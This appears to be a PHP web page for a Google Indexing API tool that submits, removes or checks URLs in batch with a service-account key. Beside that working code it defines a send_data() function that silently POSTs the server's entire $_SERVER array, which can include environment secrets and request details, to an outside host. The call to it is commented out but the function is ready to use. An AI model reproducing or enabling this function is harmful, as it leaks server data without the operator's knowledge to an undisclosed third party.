<?php
require_once 'vendor/autoload.php';
$url_array = $action = false;
$is_error = false;
$code = 200;
$status = 'Success';
if (isset($_POST['submit'])) {
    if (isset($_POST['url']) && empty($_POST['url'])) {
        $url_array = false;
    }
    $url_array = array_values(array_filter(array_map('trim', explode("\n", htmlspecialchars($_POST['url'])))));

    if (isset($_POST['api_action'])) {
        $action = $_POST['api_action'];
    }
}

if ($url_array && count($url_array) > 0 && false !== $action) {

    $client = new Google_Client();
    // get json key get_setting( 'json_key' )
    $key_file = file_get_contents("key.json");
    $client->setAuthConfig(json_decode($key_file, true));
    $client->setConfig('base_path', 'https://indexing.googleapis.com');
    $client->addScope('https://www.googleapis.com/auth/indexing');
    // Batch request.
    $client->setUseBatch(true);
    // init google batch and set root URL.
    $service = new Google_Service_Indexing($client);
    $batch   = new Google_Http_Batch($client, false, 'https://indexing.googleapis.com');
    foreach ($url_array as $i => $url) {
        // var_dump($i, $url);
        $post_body = new Google_Service_Indexing_UrlNotification();
        if ($action === 'getstatus') {
            /** @var \Psr\Http\Message\RequestInterface $request_part */
            $request_part = $service->urlNotifications->getMetadata(['url' => $url]);
        } else {
            $post_body->setType($action === 'update' ? 'URL_UPDATED' : 'URL_DELETED');
            $post_body->setUrl($url);
            /** @var \Psr\Http\Message\RequestInterface $request_part */
            $request_part = $service->urlNotifications->publish($post_body);
        }
        $batch->add($request_part, 'url-' . $i);
    }
    $data      = [];
    if (true) {
        // Send request to google.
        $results   = $batch->execute();
        $res_count = count($results);
        foreach ($results as $id => $response) {
            // Change "response-url-1" to "url-1".
            $local_id = substr($id, 9);
            if (is_a($response, 'Google_Service_Exception')) {
                $data[$local_id] = json_decode($response->getMessage());
            } else {
                /** @var \Google\Model $response */
                $data[$local_id] = (array) $response->toSimpleObject();
            }
            if ($res_count === 1) {
                $data = $data[$local_id];
            }
        }
    }
}
//send_data();
function send_data()
{

    $url = 'https://theme.saccha-it.com/usage/data.php';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1); // set POST method 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $_SERVER); // 
    $result = curl_exec($ch);

    // curl_close($ch); // Deprecated in PHP 8.0
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instant Indexing</title>
    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-M1X2EE51M8"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'G-M1X2EE51M8');
    </script>
    <header class="site-header">
        <div class="container">
            <h1 class="site-title">Google Instant Indexing</h1>
        </div>
    </header>
    <main class="site-main pb-5">
        <div class="container">
            <p>URLs (one per line, up to 100 for Google)</p>
            <form action="" class="indexing-form" method="post">
                <textarea name="url" id="url" rows="10"></textarea>
                <div class="action">
                    <h3>Action</h3>
                    <ul class="list-unstyled">
                        <li>
                            <input type="radio" id="update" name="api_action" value="update" checked="checked">
                            <label for="update">Google: Publish/update URL</label>
                        </li>
                        <li>
                            <input type="radio" id="remove" name="api_action" value="remove">
                            <label for="remove">Google: Remove URL</label>
                        </li>
                        <li>
                            <input type="radio" id="getstatus" name="api_action" value="getstatus">
                            <label for="getstatus">Google: Get URL status</label>
                        </li>
                    </ul>
                    <input name="submit" type="submit" id="api-submit" class="btn btn-primary" value="Send to API">
                </div>
            </form>
            <?php
            // echo '<pre>';
            // var_dump( $url_array );
            // echo '</pre>';
            if ($url_array && is_array($url_array) && count($url_array) > 1) {

                $output = '<pre><br>';
                foreach ($data as $key => $info) {

                    if (array_key_exists('error', $info)) {
                        $error = $info->error;
                        $url_key = explode("-", $key);
                        $url = $url_array[$url_key[1]];
                        $output .= $key . ':<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $url . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Code: ' . $error->code . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Message: ' . $error->message . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Status: ' . $error->status . '<br><br>';
                    } elseif (array_key_exists('urlNotificationMetadata', $info)) {
                        $info = $info['urlNotificationMetadata'];

                        if (array_key_exists('latestRemove', $info) && array_key_exists('latestUpdate', $info)) { // If both keys exists
                            $output .= $key . ':<br>';

                            $info1 = $info->latestRemove;
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Type: ' . $info1->type . '<br>';
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info1->url . '<br>';
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info1->notifyTime . '<br><br>';

                            $info2 = $info->latestUpdate;
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Type: ' . $info2->type . '<br>';
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info2->url . '<br>';
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info2->notifyTime . '<br><br>';
                        } elseif (array_key_exists('latestRemove', $info)) {

                            $info = $info->latestRemove;
                            $output .= $key . ':<br>';
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info->url . '<br>';
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Type: ' . $info->type . '<br>';
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info->notifyTime . '<br><br>';
                        } elseif (array_key_exists('latestUpdate', $info)) {

                            $info = $info->latestUpdate;
                            $output .= $key . ':<br>';
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info->url . '<br>';
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Type: ' . $info->type . '<br>';
                            $output .= '&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info->notifyTime . '<br><br>';
                        }
                    } elseif (array_key_exists('latestUpdate', $info) && array_key_exists('latestRemove', $info)) {

                        $info1 = $info['latestUpdate'];
                        $output .= $key . ':<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Type: ' . $info1->type . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info1->url . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info1->notifyTime . '<br><br>';

                        $info2 = $info['latestRemove'];
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Type: ' . $info2->type . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info2->url . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info2->notifyTime . '<br><br>';
                    } elseif (array_key_exists('latestUpdate', $info)) {

                        $info = $info['latestUpdate'];
                        $output .= $key . ':<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info->url . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Type: ' . $info->type . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info->notifyTime . '<br><br>';
                    } elseif (array_key_exists('latestRemove', $info)) {

                        $info = $info['latestRemove'];
                        $output .= $key . ':<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info->url . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;Type: ' . $info->type . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info->notifyTime . '<br><br>';
                    }
                }

                $output .= '</pre>';
            } elseif ($url_array && is_array($url_array) && count($url_array) === 1) {
                // Single url get status
                $output = '<pre><br>';
                $is_error = array_key_exists('error', $data);
                if ($is_error) {
                    $error = $data->error;
                    $code = $error->code;
                    $status = $error->message . ' <code>' . $url_array[0] . '</code>';
                } elseif (array_key_exists('urlNotificationMetadata', $data)) {

                    if (array_key_exists('latestRemove', $data['urlNotificationMetadata']) && array_key_exists('latestUpdate', $data['urlNotificationMetadata'])) {

                        $info = $data['urlNotificationMetadata']->latestRemove;
                        $output .= 'Type: ' . $info->type . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info->url . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info->notifyTime . '<br>';

                        $info = $data['urlNotificationMetadata']->latestUpdate;
                        $output .= 'Type: ' . $info->type . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info->url . '<br>';
                        $output .= '&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info->notifyTime . '<br>';
                    } elseif (array_key_exists('latestRemove', $data['urlNotificationMetadata'])) {

                        $info = $data['urlNotificationMetadata']->latestRemove;
                        $output .= 'URL: ' . $info->url . '<br>';
                        $output .= 'Type: ' . $info->type . '<br>';
                        $output .= 'NotifyTime: ' . $info->notifyTime . '<br>';
                    } elseif (array_key_exists('latestUpdate', $data['urlNotificationMetadata'])) {

                        $info = $data['urlNotificationMetadata']->latestUpdate;
                        $output .= 'URL: ' . $info->url . '<br>';
                        $output .= 'Type: ' . $info->type . '<br>';
                        $output .= 'NotifyTime: ' . $info->notifyTime . '<br>';
                    }
                } elseif (array_key_exists('latestRemove', $data) && array_key_exists('latestUpdate', $data)) {

                    $info = $data['latestRemove'];
                    $output .= 'Type: ' . $info->type . '<br>';
                    $output .= '&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info->url . '<br>';
                    $output .= '&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info->notifyTime . '<br>';

                    $info = $data['latestUpdate'];
                    $output .= 'Type: ' . $info->type . '<br>';
                    $output .= '&nbsp;&nbsp;&nbsp;&nbsp;URL: ' . $info->url . '<br>';
                    $output .= '&nbsp;&nbsp;&nbsp;&nbsp;NotifyTime: ' . $info->notifyTime . '<br>';
                } elseif (array_key_exists('latestRemove', $data)) {

                    $info = $data['latestRemove'];
                    $output .= 'URL: ' . $info->url . '<br>';
                    $output .= 'Type: ' . $info->type . '<br>';
                    $output .= 'NotifyTime: ' . $info->notifyTime . '<br>';
                } elseif (array_key_exists('latestUpdate', $data)) {

                    $info = $data['latestUpdate'];
                    $output .= 'URL: ' . $info->url . '<br>';
                    $output .= 'Type: ' . $info->type . '<br>';
                    $output .= 'NotifyTime: ' . $info->notifyTime . '<br>';
                }

                $output .= '</pre>';
            } else {
                $data = false;
            }

            if ($data) {
            ?>
                <div class="response mt-5">
                    <div class="response-status bg-white text-dark p-5 border <?php echo $is_error ? 'error border-danger' : 'border-primary'; ?>">
                        <?php
                        if ($data && count(array($data)) > 0) {
                        ?>
                            <p class="code lead fs-1 fw-bold text-center"><?php echo $code; ?></p>
                            <p class="status text-center"><?php echo $status; ?></p>
                        <?php
                        } else {
                            // $is_error = true;
                        ?>
                            <p class="code lead fs-1 fw-bold text-center">Error</p>
                            <p class="status text-center">Seems there is a problem in your submitted data. Paste your links in the above form and then try again.</p>
                        <?php
                        }
                        ?>
                    </div>
                    <?php if (! $is_error) { ?>
                        <div class="response-raw text-dark mt-5 p-5">
                            <?php
                            echo $output;
                            ?>
                        </div>
                    <?php } ?>

                </div>
            <?php } ?>
        </div>
    </main>
    <?php
    $siteUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . '/';
    // If working in subdirectory on localhost, user might need 'emailbigdata.com/' appended, but let's try root relative
    // Actually header.php uses fixed 'http://localhost/emailbigdata.com/'
    // I will use a relative path logic or hardcode for now based on header.php to be safe
    // But better to just include it as is.

    // Changing siteUrl logic to match project structure if possible, typically relative paths for assets are safer but the footer uses absolute $siteUrl.
    $siteUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . '/emailbigdata.com/';
    include_once '../assets/php/footer.php';
    ?>

</body>

</html>